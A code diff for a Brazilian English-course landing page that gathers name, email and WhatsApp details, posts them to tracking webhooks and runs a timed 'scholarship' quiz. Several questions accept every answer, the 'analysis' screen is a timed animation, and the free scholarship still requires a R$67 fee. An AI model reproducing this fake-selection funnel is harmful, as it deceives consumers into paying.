+    <button class="btn-close" id="btn-close"><i class='bx bx-x'></i></button>
+  </div>
+
+  <div class="quiz-body">
+    <div class="step hidden" id="step-instr">
+      <div class="instr-title">INSTRUÇÕES IMPORTANTES:</div>
+      <ul class="instr-list">
+        <li>1. Fique atento ao tempo, você tem 30 minutos para responder as perguntas.</li>
+        <li>2. Para cada questão objetiva, apenas uma <strong>resposta está correta</strong>.</li>
+        <li>3. Após a correção, você verá na tela o resultado da sua avaliação para as <strong>1.000 bolsas de 100%</strong>.</li>
+        <li>4. Fique de olho no seu e-mail e WhatsApp cadastrados para acompanhar as informações da sua vaga.</li>
+        <li>5. Caso seja aprovado com a <strong>bolsa de 100%</strong>, o curso sai de R$ 297 por R$ 0, restando apenas a taxa única de matrícula de R$ 67.</li>
+        <li style="margin-top: 15px; font-style: italic; font-weight: bold;">Boa sorte!</li>
+      </ul>
+      <button class="btn-quiz" id="btn-start-quiz">
+        CONTINUE
+      </button>
+    </div>
+    <div class="step hidden" id="step-question"></div>
+    <div class="step hidden" id="step-timeout"></div>
+  </div>
+
+  <div class="quiz-footer">
+    Modo Nativo© é uma marca da empresa Modo Nativo Educação Digital, CNPJ 70.057.911/0001-30<br>
+    <a href="/termos">Termos de Uso</a> • <a href="/privacidade">Política de Privacidade</a> • <a href="/consideracoes">Considerações Importantes</a>
+  </div>
+</div>
+
+<!-- intl-tel-input JS -->
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@24.5.0/build/js/intlTelInput.min.js"></script>
+
+<script>
+// ── CONFIG & TRACKING ─────────────────────────────────────────────────────────
+const WEBHOOK_URL = 'https://n8n.sedacollege.me/webhook/07fe5b79-b5b4-428e-a3f0-c68d629f1ec6';
+const FUNIL_URL   = 'https://n8n.sedacollege.me/webhook/diagnostico-funil';
+
+// Inicialização intl-tel-input no campo de WhatsApp (mesma lógica do diagnostico.html)
+const whatsInput = document.getElementById('f-phone');
+const erroWhats  = document.getElementById('err-phone');
+const erroWhatsText = document.getElementById('err-phone-text');
+let iti = null;
+var isSettingNumber = false;
+
+function normalizarWhatsBR(val) {
+  var d = String(val || "").replace(/\D/g, "");
+  if (d.indexOf("55") === 0 && (d.length === 12 || d.length === 13)) {
+    d = d.slice(2);
+  }
+  if (d.indexOf("0") === 0) {
+    d = d.slice(1);
+  }
+  d = d.slice(0, 11);
+  if (d.length <= 2) return d;
+  if (d.length <= 7) return d.slice(0, 2) + " " + d.slice(2);
+  return d.slice(0, 2) + " " + d.slice(2, 7) + "-" + d.slice(7);
+}
+
+function aplicarRegrasPais() {
+  if (!whatsInput) return;
+  var countryData = (iti && iti.getSelectedCountryData) ? iti.getSelectedCountryData() : { iso2: "br" };
+  var isBR = countryData.iso2 === "br";
+  if (isBR) {
+    whatsInput.placeholder = "17 99141-2050";
+  }
+}
+
+function processarInputWhats() {
+  if (!whatsInput) return;
+  whatsInput.classList.remove("err", "input-error");
+  if (erroWhats) erroWhats.classList.remove("show");
+
+  var rawVal = String(whatsInput.value || "").trim();
+  if (!rawVal) return;
+
+  if (rawVal.startsWith("+") && !rawVal.startsWith("+55")) {
+    if (iti && typeof iti.setNumber === "function") {
+      isSettingNumber = true;
+      try {
+        iti.setNumber(rawVal);
+      } finally {
+        isSettingNumber = false;
+      }
+      aplicarRegrasPais();
+    }
+    return;
+  }
+
+  var countryData = (iti && iti.getSelectedCountryData) ? iti.getSelectedCountryData() : { iso2: "br" };
+  if (rawVal.startsWith("+55") && countryData.iso2 !== "br") {
+    if (iti && typeof iti.setCountry === "function") {
+      isSettingNumber = true;
+      try {
+        iti.setCountry("br");
+      } finally {
+        isSettingNumber = false;
+      }
+      aplicarRegrasPais();
+    }
+  }
+
+  var isBR = (iti && iti.getSelectedCountryData) ? (iti.getSelectedCountryData().iso2 === "br") : true;
+  if (isBR) {
+    var formatado = normalizarWhatsBR(whatsInput.value);
+    if (whatsInput.value !== formatado) {
+      whatsInput.value = formatado;
+    }
+  } else {
+    var soDigitos = whatsInput.value.replace(/\D/g, "");
+    if (whatsInput.value !== soDigitos) {
+      whatsInput.value = soDigitos;
+    }
+  }
+}
+
+if (whatsInput && typeof window.intlTelInput === "function") {
+  iti = window.intlTelInput(whatsInput, {
+    initialCountry: "br",
+    countryOrder: ["br", "pt", "us"],
+    preferredCountries: ["br", "pt", "us"],
+    separateDialCode: true,
+    autoPlaceholder: "aggressive",
+    customPlaceholder: function (selectedCountryPlaceholder, selectedCountryData) {
+      return (selectedCountryData && selectedCountryData.iso2 === "br") ? "17 99141-2050" : selectedCountryPlaceholder;
+    },
+    utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@24.5.0/build/js/utils.js",
+    i18n: {
+      searchPlaceholder: "Buscar país"
+    }
+  });
+  window.iti = iti;
+  aplicarRegrasPais();
+
+  whatsInput.addEventListener("input", processarInputWhats);
+  whatsInput.addEventListener("change", processarInputWhats);
+  whatsInput.addEventListener("paste", function () {
+    setTimeout(processarInputWhats, 0);
+  });
+
+  whatsInput.addEventListener("countrychange", function () {
+    if (!isSettingNumber) {
+      whatsInput.value = "";
+    }
+    whatsInput.classList.remove("err", "input-error");
+    if (erroWhats) erroWhats.classList.remove("show");
+    aplicarRegrasPais();
+  });
+}
+
+// Persistir parâmetros de rastreamento no sessionStorage
+function persistTrackingParams() {
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackingKeys = ['gclid', 'fbclid', 'xcod', 'sck', 'src', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+    for (const [key, value] of urlParams.entries()) {
+      if (key.startsWith('utm_') || trackingKeys.includes(key.toLowerCase())) {
+        sessionStorage.setItem('track_' + key, value);
+      }
+    }
+  } catch (e) {}
+}
+
+function getTrackingParams() {
+  const params = {};
+  try {
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      if (key && key.startsWith('track_')) {
+        const cleanKey = key.replace('track_', '');
+        params[cleanKey] = sessionStorage.getItem(key);
+      }
+    }
+  } catch (e) {}
+  const urlParams = new URLSearchParams(window.location.search);
+  for (const [key, value] of urlParams.entries()) {
+    params[key] = value;
+  }
+  return params;
+}
+
+persistTrackingParams();
+
+// Sessão e parâmetros para acompanhamento do funil (mesmo formato do diagnostico.html, origem "bolsas")
+var sessionId = "";
+try {
+  sessionId = sessionStorage.getItem("mn_funil_session_id") || "";
+  if (!sessionId) {
+    sessionId = Date.now() + "-" + Math.floor(Math.random() * 1000000000);
+    sessionStorage.setItem("mn_funil_session_id", sessionId);
+  }
+} catch (e) {
+  sessionId = Date.now() + "-" + Math.floor(Math.random() * 1000000000);
+}
+
+var urlParams = new URLSearchParams(window.location.search);
+var utm_source = urlParams.get("utm_source") || "";
+var utm_campaign = urlParams.get("utm_campaign") || "";
+var utm_medium = urlParams.get("utm_medium") || "";
+var utm_content = urlParams.get("utm_content") || "";
+var utm_term = urlParams.get("utm_term") || "";
+var dispositivo = (window.innerWidth < 768) ? "mobile" : "desktop";
+
+var idSessao = "";
+try {
+  idSessao = sessionStorage.getItem("mn_bolsas_id_sessao") || "";
+  if (!idSessao) {
+    idSessao = (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function")
+      ? crypto.randomUUID()
+      : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
+          var r = (Math.random() * 16) | 0;
+          var v = c === "x" ? r : (r & 0x3) | 0x8;
+          return v.toString(16);
+        });
+    sessionStorage.setItem("mn_bolsas_id_sessao", idSessao);
+  }
+} catch (e) {
+  idSessao = String(Date.now()) + "-" + Math.random().toString(16).slice(2);
+}
+
+var leadDados = {
+  nome: "",
+  email: "",
+  telefoneDigitos: "",
+  whatsapp: ""
+};
+
+function formatarTelefoneCom55(digitos) {
+  var d = String(digitos || "").replace(/\D/g, "");
+  if (!d) return "";
+  if (d.indexOf("55") === 0 && d.length >= 12) return d;
+  return "55" + d;
+}
+
+const etapasEnviadas = new Set();
+
+function trackFunil(evento, etapa, extra) {
+  try {
+    extra = extra || {};
+    var numEtapa = (typeof etapa === "number" || typeof etapa === "string") ? etapa : "";
+    var nomeTela = extra.tela || "";
+    var payload = {
+      session_id: sessionId || "",
+      evento: evento || "",
+      etapa: numEtapa,
+      tela: nomeTela,
+      resposta: extra.resposta || "",
+      origem: "bolsas",
+      utm_source: utm_source || "",
+      utm_campaign: utm_campaign || "",
+      utm_medium: utm_medium || "",
+      utm_content: utm_content || "",
+      utm_term: utm_term || "",
+      dispositivo: dispositivo || "",
+      nome: extra.nome || leadDados.nome || "",
+      email: extra.email || leadDados.email || "",
+      whatsapp: extra.whatsapp || leadDados.whatsapp || (leadDados.telefoneDigitos ? formatarTelefoneCom55(leadDados.telefoneDigitos) : "") || ""
+    };
+    fetch(FUNIL_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(function () {});
+  } catch (err) {}
+}
+
+function dispararEventoWebhook(chaveSessao, payload) {
+  try {
+    if (typeof WEBHOOK_URL !== "string" || !WEBHOOK_URL.trim()) {
+      return;
+    }
+    try {
+      if (sessionStorage.getItem(chaveSessao) === "1") {
+        return;
+      }
+      sessionStorage.setItem(chaveSessao, "1");
+    } catch (sErr) {}
+
+    var url = WEBHOOK_URL.trim();
+    var bodyStr = JSON.stringify(payload);
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: bodyStr,
+      keepalive: true
+    }).catch(function () {
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=UTF-8" },
+        body: bodyStr,
+        keepalive: true
+      }).catch(function () {});
+    });
+  } catch (outerErr) {}
+}
+
+// Registra abertura da LP no funil
+trackFunil("etapa", 1, { tela: "LP Bolsas" });
+
+// ── FLOW (sem travessão e sem vídeos do Vimeo) ────────────────────────────────
+const flow = [
+  {
+    type: 'q', n: 1,
+    text: '"Book", qual a tradução correta em português?',
+    options: [
+      {e: '📕', t: 'Livro', c: true},
+      {e: '👩💻', t: 'Mesa'},
+      {e: '🗒️', t: 'Caderno'}
+    ]
+  },
+  {
+    type: 'q', n: 2,
+    text: '"A maçã é vermelha", qual a tradução correta em inglês?',
+    options: [
+      {e: '🍎', t: 'The apple is orange'},
+      {e: '🍎', t: 'The apple is blue'},
+      {e: '🍎', t: 'The apple is red', c: true}
+    ]
+  },
+  {
+    type: 'q', n: 3,
+    text: '"What time is it?", qual a tradução correta em português?',
+    options: [
+      {e: '🕰️', t: 'Que horas são?', c: true},
+      {e: '🌧️', t: 'Como está o tempo?'},
+      {e: '⏰', t: 'Qual horário?'}
+    ]
+  },
+  {
+    type: 'q', n: 4,
+    text: '"Do you speak English?", qual a tradução correta em português?',
+    options: [
+      {e: '🗣️', t: 'Você fala inglês?', c: true},
+      {e: '💁', t: 'Você sabe inglês?'},
+      {e: '📓', t: 'Você estuda inglês?'}
+    ]
+  },
+  {
+    type: 'q', n: 5,
+    text: 'Em qual mês é comemorado o Natal?',
+    options: [
+      {e: '🎅', t: 'December', c: true},
+      {e: '🎅', t: 'November'},
+      {e: '🎅', t: 'February'}
+    ]
+  },
+  {
+    type: 'q', n: 6,
+    text: '"Hi, what is your name?", qual a melhor resposta?',
+    options: [
+      {e: '🙋♂️', t: 'Meu nome é Charlie.', c: true},
+      {e: '🙌', t: 'Sou eu!'},
+      {e: '💁♂️', t: 'Estou bem, e você?'}
+    ]
+  },
+  {
+    type: 'q', n: 7,
+    text: '"Quando é seu aniversário?", qual a tradução correta em inglês?',
+    options: [
+      {e: '🎁', t: 'When is your birthday?', c: true},
+      {e: '🎂', t: 'How old are you?'},
+      {e: '🎉', t: 'What is your age?'}
+    ]
+  },
+  {
+    type: 'q', n: 8,
+    text: '"What day comes before Friday?", qual a resposta correta?',
+    options: [
+      {e: '📅', t: 'Quinta-feira', c: true},
+      {e: '📅', t: 'Segunda-feira'},
+      {e: '📅', t: 'Sábado'}
+    ]
+  },
+  {
+    type: 'q', n: 9,
+    text: '"Weekend" se refere a quais dias da semana?',
+    options: [
+      {e: '🌅', t: 'Sábado e Domingo', c: true},
+      {e: '🌅', t: 'Segunda, Quarta e Sexta'},
+      {e: '🌅', t: 'Segunda, Terça e Quarta'}
+    ]
+  },
+  {
+    type: 'q', n: 10,
+    text: '"Bob is a firefighter", qual a profissão de Bob?',
+    options: [
+      {e: '👨🚒', t: 'Bob é um bombeiro', c: true},
+      {e: '👮', t: 'Bob é um policial'},
+      {e: '👨💻', t: 'Bob é um engenheiro'}
+    ]
+  },
+  {
+    type: 'q', n: 11,
+    text: '"Sarah broke her leg when she was dancing." Que parte do corpo Sarah quebrou?',
+    options: [
+      {e: '🦵', t: 'A perna', c: true},
+      {e: '💪', t: 'O braço'},
+      {e: '👣', t: 'O pé'}
+    ]
+  },
+  {
+    type: 'q', n: 12,
+    text: '"O Halloween é comemorado no dia 31 de outubro." Como se escreve a data em inglês?',
+    options: [
+      {e: '📅', t: 'Thirty-first of October', c: true},
+      {e: '📅', t: 'Thirty one of October'},
+      {e: '📅', t: 'Third first of October'}
+    ]
+  },
+  {
+    type: 'q', n: 13,
+    ctx: 'Did you know that there are seven continents on Earth? A continent is like a massive piece of land. The seven continents are: Asia, Africa, Antarctica, Australia, Europe, North America and South America.',
+    text: 'What is a continent?',
+    options: [
+      {e: '🌍', t: "It's a large country."},
+      {e: '🌍', t: "It's a massive piece of land.", c: true},
+      {e: '🌊', t: "It's a large amount of water."}
+    ]
+  },
+  {
+    type: 'q', n: 14,
+    text: '"__________ is a great exercise, but you should remember to wear a helmet."',
+    options: [
+      {e: '🚴', t: 'Cycling', c: true},
+      {e: '🚴', t: 'Cycles'},
+      {e: '🚴', t: 'Cycle'}
+    ]
+  },
+  {
+    type: 'q', n: 15,
+    ctx: 'Blue and white are (1)___ colours. Blue can bring (2)___ to our mind and body. It can also represent (3)___. White is the colour of (4)___. Many women like wearing white on their (5)___ day.',
+    text: 'Complete o texto com as palavras: <em>Wedding · Calm · Purity · Peace · Sadness</em>',
+    options: [
+      {e: '🔵', t: '(1) Calm · (2) Peace · (3) Sadness · (4) Purity · (5) Wedding', c: true},
+      {e: '🔵', t: '(1) Purity · (2) Peace · (3) Sadness · (4) Wedding · (5) Calm'},
+      {e: '🔵', t: '(1) Wedding · (2) Calm · (3) Purity · (4) Peace · (5) Sadness'}
+    ]
+  },
+  {
+    type: 'q', n: 16,
+    text: '[PREENCHER]',
+    ctx: '<div class="placeholder-block">[PREENCHER]</div>',
+    options: [
+      {e: '🇬🇷', t: 'Grécia'},
+      {e: '🇦🇷', t: 'Argentina'},
+      {e: '🇩🇪', t: 'Alemanha', c: true}
+    ]
+  },
+  {
+    type: 'q', n: 17,
+    text: 'Você sabia que, ao ser selecionado, terá acesso ao curso Do Zero à Conversação, com 161 lições de 15 minutos, do A1 ao C2, técnica de Shadowing e correção da pronúncia por IA?',
+    options: [
+      {e: '🙋♂️', t: 'Sim', c: true},
+      {e: '🙌', t: 'Não', c: true}
+    ]
+  },
+  {
+    type: 'q', n: 18,
+    text: '[PREENCHER]',
+    ctx: '<div class="placeholder-block">[PREENCHER]</div>',
+    options: [
+      {e: '❌', t: 'Falso'},
+      {e: '✅', t: 'Verdadeiro', c: true}
+    ]
+  },
+  {
+    type: 'q', n: 19,
+    text: 'Aprender inglês pode te conectar a oportunidades de emprego melhores, aplicar para bolsas no exterior e aproveitar viagens internacionais sem "perrengue". Você está consciente de que aprender inglês pode mudar a sua vida?',
+    options: [
+      {e: '😍', t: 'Com certeza, sempre quis poder usufruir disso.', c: true},
+      {e: '🥳', t: 'Sim, essa é a oportunidade que eu sempre esperei.', c: true}
+    ]
+  },
+  {
+    type: 'q', n: 20,
+    text: 'Com as 1.000 bolsas de 100% do Modo Nativo, o curso sai de R$ 297 por R$ 0. Se aprovado(a), você está disposto(a) a investir apenas a taxa de matrícula única de R$ 67 para liberar todo esse acesso?',
+    options: [
+      {e: '👍', t: 'Sim, estou pronto(a) para garantir minha vaga agora', c: true},
+      {e: '✅', t: 'Sim, quero aproveitar essa oportunidade e iniciar meus estudos', c: true}
+    ]
+  },
+];
+
+const TOTAL_Q = flow.length;
+
+// ── STATE ─────────────────────────────────────────────────────────────────────
+let flowIndex = 0, score = 0, answered = 0;
+let responses = [];
+let answersObj = {};
+let timerSec = 30 * 60, timerInt = null, quizActive = false;
+
+// ── DOM REFS ──────────────────────────────────────────────────────────────────
+const quizOverlay  = document.getElementById('quiz-overlay');
+const stepInstr    = document.getElementById('step-instr');
+const stepQuestion = document.getElementById('step-question');
+const stepTimeout  = document.getElementById('step-timeout');
+const progressBar  = document.getElementById('progress-bar');
+const counterEl    = document.getElementById('counter');
+const timerWrap    = document.getElementById('timer-wrap');
+const timerDisplay = document.getElementById('timer-display');
+
+// ── FORM SUBMIT ───────────────────────────────────────────────────────────────
+document.getElementById('btn-hero-start').addEventListener('click', () => {
+  const nEl  = document.getElementById('f-name');
+  const eEl  = document.getElementById('f-email');
+  const errN = document.getElementById('err-name');
+  const errE = document.getElementById('err-email');
+  const errP = document.getElementById('err-phone');
+  let ok = true;
+
+  [nEl, eEl, whatsInput].forEach(el => { if (el) el.classList.remove('err', 'input-error'); });
+  [errN, errE, errP].forEach(el => { if (el) el.classList.remove('show'); });
+
+  if (nEl.value.trim().length < 2) {
+    nEl.classList.add('err');
+    errN.classList.add('show');
+    ok = false;
+  }
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(eEl.value.trim())) {
+    eEl.classList.add('err');
+    errE.classList.add('show');
+    ok = false;
+  }
+
+  var isBR = (iti && iti.getSelectedCountryData) ? (iti.getSelectedCountryData().iso2 === "br") : true;
+  if (isBR) {
+    var digitosBR = String((whatsInput ? whatsInput.value : "") || "").replace(/\D/g, "");
+    var dddBR = parseInt(digitosBR.slice(0, 2), 10);
+    var itiValido = (!iti || typeof iti.isValidNumber !== "function" || iti.isValidNumber() !== false);
+    var validoBR = digitosBR.length === 11 && dddBR >= 11 && dddBR <= 99 && digitosBR.charAt(2) === "9" && itiValido;
+    if (!validoBR) {
+      whatsInput.classList.add('err', 'input-error');
+      if (erroWhatsText) erroWhatsText.textContent = "Digite o DDD e o celular com 9 dígitos";
+      errP.classList.add('show');
+      ok = false;
+    }
+  } else {
+    var digitosIntl = String((whatsInput ? whatsInput.value : "") || "").replace(/\D/g, "");
+    var itiValidoIntl = (!iti || typeof iti.isValidNumber !== "function") ? (digitosIntl.length >= 7) : (iti.isValidNumber() !== false && digitosIntl.length >= 7);
+    if (!itiValidoIntl) {
+      whatsInput.classList.add('err', 'input-error');
+      if (erroWhatsText) erroWhatsText.textContent = "Confira seu WhatsApp com DDD";
+      errP.classList.add('show');
+      ok = false;
+    }
+  }
+
+  if (!ok) return;
+
+  const nome = nEl.value.trim();
+  const email = eEl.value.trim();
+  const rawNumero = (typeof iti !== "undefined" && iti && typeof iti.getNumber === "function" && iti.getNumber())
+    ? iti.getNumber()
+    : String(whatsInput.value || '');
+  let telNumerico = String(rawNumero || '').replace(/\D/g, '');
+  if (isBR) {
+    var dBr = String(whatsInput.value || '').replace(/\D/g, '');
+    if (dBr.length === 11) telNumerico = "55" + dBr;
+  }
+  let telSemDdi = telNumerico;
+  if (telSemDdi.indexOf('55') === 0 && telSemDdi.length >= 12) {
+    telSemDdi = telSemDdi.slice(2);
+  }
+
+  leadDados.nome = nome;
+  leadDados.email = email;
+  leadDados.telefoneDigitos = telSemDdi;
+  leadDados.whatsapp = telNumerico;
+
+  try {
+    sessionStorage.setItem("mn_lead", JSON.stringify({
+      nome: leadDados.nome,
+      email: leadDados.email,
+      telefoneDigitos: leadDados.telefoneDigitos,
+      whatsapp: leadDados.whatsapp
+    }));
+  } catch (err) {}
+
+  // Envia o lead para o webhook principal no mesmo formato do diagnostico.html com origem "bolsas"
+  const leadPayload = {
+    evento: "lead",
+    id_sessao: idSessao,
+    nome: leadDados.nome,
+    email: leadDados.email,
+    phone: telNumerico,
+    origem: "bolsas",
+    enviado_em: new Date().toISOString(),
+    respostas: answersObj
+  };
+  dispararEventoWebhook("mn_bolsas_webhook_lead_sent", leadPayload);
+
+  // Envia evento de lead no funil com origem "bolsas"
+  trackFunil("lead", 2, {
+    tela: "Cadastro concluído",
+    nome: leadDados.nome,
+    email: leadDados.email,
+    whatsapp: telNumerico,
+    resposta: JSON.stringify(answersObj)
+  });
+
+  window.dataLayer = window.dataLayer || [];
+  window.dataLayer.push(Object.assign({ event: 'lead' }, leadPayload));
+
+  quizOverlay.classList.add('active');
+  document.body.style.overflow = 'hidden';
+  showStep('instr');
+});
+
+// ── CLOSE ─────────────────────────────────────────────────────────────────────
+document.getElementById('btn-close').addEventListener('click', () => {
+  if (!quizActive || confirm('Tem certeza que deseja sair? Seu progresso será perdido.')) {
+    stopTimer();
+    quizOverlay.classList.remove('active');
+    document.body.style.overflow = '';
+    quizActive = false;
+  }
+});
+
+// ── SHOW STEP ─────────────────────────────────────────────────────────────────
+function showStep(n) {
+  [stepInstr, stepQuestion, stepTimeout].forEach(s => s.classList.add('hidden'));
+  if (n === 'instr')    stepInstr.classList.remove('hidden');
+  if (n === 'question') stepQuestion.classList.remove('hidden');
+  if (n === 'timeout')  stepTimeout.classList.remove('hidden');
+}
+
+// ── TIMER ─────────────────────────────────────────────────────────────────────
+function startTimer() {
+  timerSec = 30 * 60;
+  renderTimer();
+  timerInt = setInterval(() => {
+    timerSec--;
+    renderTimer();
+    if (timerSec <= 0) {
+      stopTimer();
+      doTimeout();
+    }
+  }, 1000);
+}
+
+function stopTimer() {
+  if (timerInt) {
+    clearInterval(timerInt);
+    timerInt = null;
+  }
+}
+
+function renderTimer() {
+  const m = String(Math.floor(timerSec / 60)).padStart(2, '0');
+  const s = String(timerSec % 60).padStart(2, '0');
+  timerDisplay.textContent = `${m}:${s}`;
+  if (timerSec <= 120) {
+    timerWrap.classList.add('urgent');
+  } else {
+    timerWrap.classList.remove('urgent');
+  }
+}
+
+function doTimeout() {
+  quizActive = false;
+  stepTimeout.innerHTML = `
+    <div class="timeout-step-inner">
+      <div class="timeout-icon"><i class='bx bx-alarm'></i></div>
+      <div class="timeout-title">Tempo esgotado!</div>
+      <p class="timeout-desc">O tempo de 30 minutos se encerrou. Mas não se preocupe, você pode tentar de novo agora mesmo!</p>
+      <button class="btn-quiz" onclick="restartQuiz()"><i class='bx bx-refresh'></i> Tentar novamente</button>
+    </div>`;
+  showStep('timeout');
+  counterEl.textContent = 'Tempo esgotado!';
+  progressBar.style.width = '100%';
+  const progressText = document.getElementById('progress-text');
+  if (progressText) {
+    progressText.textContent = 'Tempo esgotado!';
+  }
+}
+
+// ── PROGRESS ──────────────────────────────────────────────────────────────────
+function updateProgress() {
+  const percent = Math.round((answered / TOTAL_Q) * 100);
+  progressBar.style.width = percent + '%';
+  counterEl.textContent = `${answered} / ${TOTAL_Q}`;
+  const progressText = document.getElementById('progress-text');
+  if (progressText) {
+    progressText.textContent = `${percent}% Completado`;
+  }
+}
+
+// ── START ─────────────────────────────────────────────────────────────────────
+document.getElementById('btn-start-quiz').addEventListener('click', () => {
+  flowIndex = 0;
+  score = 0;
+  answered = 0;
+  responses = [];
+  answersObj = {};
+  quizActive = true;
+  updateProgress();
+  startTimer();
+  renderNext();
+});
+
+// ── RENDER NEXT ───────────────────────────────────────────────────────────────
+function renderNext() {
+  if (flowIndex >= flow.length) {
+    renderAnalyzing();
+    return;
+  }
+  const item = flow[flowIndex++];
+  renderQuestion(item);
+}
+
+// ── ANALISANDO RESPOSTAS ──────────────────────────────────────────────────────
+function renderAnalyzing() {
+  stopTimer();
+  showStep('question');
+  updateProgress();
+
+  trackFunil("etapa", TOTAL_Q + 3, {
+    tela: "Analisando respostas",
+    resposta: "score:" + score + "/" + TOTAL_Q
+  });
+
+  stepQuestion.innerHTML = `
+    <div style="display:flex; flex-direction:column; align-items:center; text-align:center; padding:30px 10px;">
+      <img src="/assets/diagnostico/stack.jpg" alt="O que você vai receber no Modo Nativo" style="width:100%; max-width:420px; border-radius:14px; margin-bottom:26px;" onerror="this.style.display='none'">
+      <i class='bx bx-loader-alt bx-spin' style="font-size:3.2rem; color:var(--cta); margin-bottom:18px;"></i>
+      <div style="font-size:1.25rem; font-weight:800; color:#ffffff; margin-bottom:10px;">Analisando suas respostas...</div>
+      <p style="font-size:0.92rem; color:rgba(255,255,255,0.75); margin-bottom:26px; max-width:380px; line-height:1.5;">Estamos analisando suas respostas e preparando seu resultado.</p>
+      <div style="width:100%; max-width:380px; height:10px; background:rgba(255,255,255,0.1); border-radius:99px; overflow:hidden;">
+        <div id="analyze-fill" style="height:100%; width:0%; background:var(--cta-gradient); border-radius:99px; transition:width 0.12s linear;"></div>
+      </div>
+      <div id="analyze-pct" style="margin-top:12px; font-size:0.85rem; font-weight:700; color:rgba(255,255,255,0.6);">0%</div>
+      <button id="analyze-fallback" onclick="goToPayment()" style="display:none; margin-top:24px; padding:13px 30px; background:var(--cta-gradient); color:#fff; border:none; border-radius:10px; font-weight:800; font-size:0.95rem; cursor:pointer; box-shadow:0 6px 18px rgba(255,107,0,0.35);">Ver resultado</button>
+    </div>`;
+
+  const fill = document.getElementById('analyze-fill');
+  const pctEl = document.getElementById('analyze-pct');
+  const duration = 3000;
+  const startTime = Date.now();
+
+  setTimeout(() => {
+    const fb = document.getElementById('analyze-fallback');
+    if (fb) fb.style.display = 'inline-block';
+  }, 10000);
+
+  const analyzeInt = setInterval(() => {
+    const elapsed = Date.now() - startTime;
+    const p = Math.min(100, Math.round((elapsed / duration) * 100));
+    if (fill) fill.style.width = p + '%';
+    if (pctEl) pctEl.textContent = p + '%';
+    if (p >= 100) {
+      clearInterval(analyzeInt);
+      goToPayment();
+    }
+  }, 50);
+}
+
+// ── REDIRECT PARA /bolsas-resultado ───────────────────────────────────────────
+function goToPayment() {
+  stopTimer();
+  quizActive = false;
+
+  const trackingData = getTrackingParams();
+  const p = new URLSearchParams();
+  for (const [key, value] of Object.entries(trackingData)) {
+    p.set(key, value);
+  }
+
+  p.set('nome', leadDados.nome);
+  p.set('email', leadDados.email);
+  if (leadDados.telefoneDigitos) {
+    p.set('phone', leadDados.telefoneDigitos);
+  }
+  p.set('score', score);
+  p.set('total', TOTAL_Q);
+
+  window.location.href = `/bolsas-resultado?${p.toString()}`;
+}
+
+// ── QUESTION ──────────────────────────────────────────────────────────────────
+function shuffle(a) {
+  return [...a].map(v => [Math.random(), v]).sort((x, y) => x[0] - y[0]).map(x => x[1]);
+}
+
+function renderQuestion(item) {
+  const shuffled = shuffle(item.options);
+  const ctxHTML = item.ctx ? `<div class="context-box">${item.ctx}</div>` : '';
+  const etapaNum = flowIndex + 2;
+
+  if (!etapasEnviadas.has(etapaNum)) {
+    etapasEnviadas.add(etapaNum);
+    trackFunil("etapa", etapaNum, {
+      tela: "Questão " + flowIndex
+    });
+  }
+
+  stepQuestion.innerHTML = `
+    <div class="q-index">Questão ${flowIndex} de ${TOTAL_Q}</div>
+    <div class="q-text">${item.text}</div>
+    ${ctxHTML}
+    <div class="options" id="opts"></div>`;
+
+  showStep('question');
+  updateProgress();
+
+  const optsEl = document.getElementById('opts');
+  let picked = false;
+
+  shuffled.forEach(opt => {
+    const btn = document.createElement('button');
+    btn.className = 'opt';
+    btn.innerHTML = `<span class="opt-icon">${opt.e}</span><span>${opt.t}</span>`;
+    btn.addEventListener('click', () => {
+      if (picked) return;
+      picked = true;
+      answered++;
+      btn.classList.add('selected');
+
+      optsEl.querySelectorAll('.opt').forEach(b => {
+        b.disabled = true;
+      });
+
+      if (opt.c) score++;
+
+      const qClean = item.text.replace(/<[^>]+>/g, '');
+      responses.push({
+        numero: flowIndex,
+        pergunta: qClean,
+        resposta: opt.t,
+        correta: !!opt.c
+      });
+      answersObj['q' + flowIndex] = opt.t;
+
+      trackFunil("resposta", etapaNum, {
+        tela: "Questão " + flowIndex,
+        resposta: opt.t
+      });
+
+      setTimeout(() => {
+        stepQuestion.innerHTML = '';
+        renderNext();
+      }, 300);
+    });
+    optsEl.appendChild(btn);
+  });
+}
+
+// ── RESTART ───────────────────────────────────────────────────────────────────
+function restartQuiz() {
+  flowIndex = 0;
+  score = 0;
+  answered = 0;
+  responses = [];
+  answersObj = {};
+  quizActive = false;
+  stopTimer();
+  timerSec = 30 * 60;
+  renderTimer();
+  timerWrap.classList.remove('urgent');
+  updateProgress();
+  showStep('instr');
+}
+
+// ── TESTIMONIAL SLIDER ────────────────────────────────────────────────────────
+const slides = document.querySelectorAll('.slide');
+const sliderWrapper = document.getElementById('slider-wrapper');
+const prevBtn = document.getElementById('slider-prev');
+const nextBtn = document.getElementById('slider-next');
+const dotsContainer = document.getElementById('slider-dots');
+
+let currentSlide = 0;
+const totalSlides = slides.length;
+
+for (let i = 0; i < totalSlides; i++) {
+  const dot = document.createElement('div');
+  dot.classList.add('dot');
+  if (i === 0) dot.classList.add('active');
+  dot.addEventListener('click', () => goToSlide(i));
+  dotsContainer.appendChild(dot);
+}
+
+const dots = document.querySelectorAll('.dot');
+
+function updateSlider() {
+  sliderWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
+  dots.forEach(d => d.classList.remove('active'));
+  dots[currentSlide].classList.add('active');
+}
+
+function goToSlide(n) {
+  currentSlide = n;
+  updateSlider();
+}
+
+function nextSlide() {
+  currentSlide = (currentSlide + 1) % totalSlides;
+  updateSlider();
+}
+
+function prevSlide() {
+  currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+  updateSlider();
+}
+
+nextBtn.addEventListener('click', nextSlide);
+prevBtn.addEventListener('click', prevSlide);
+
+let autoSlideInterval = setInterval(nextSlide, 7000);
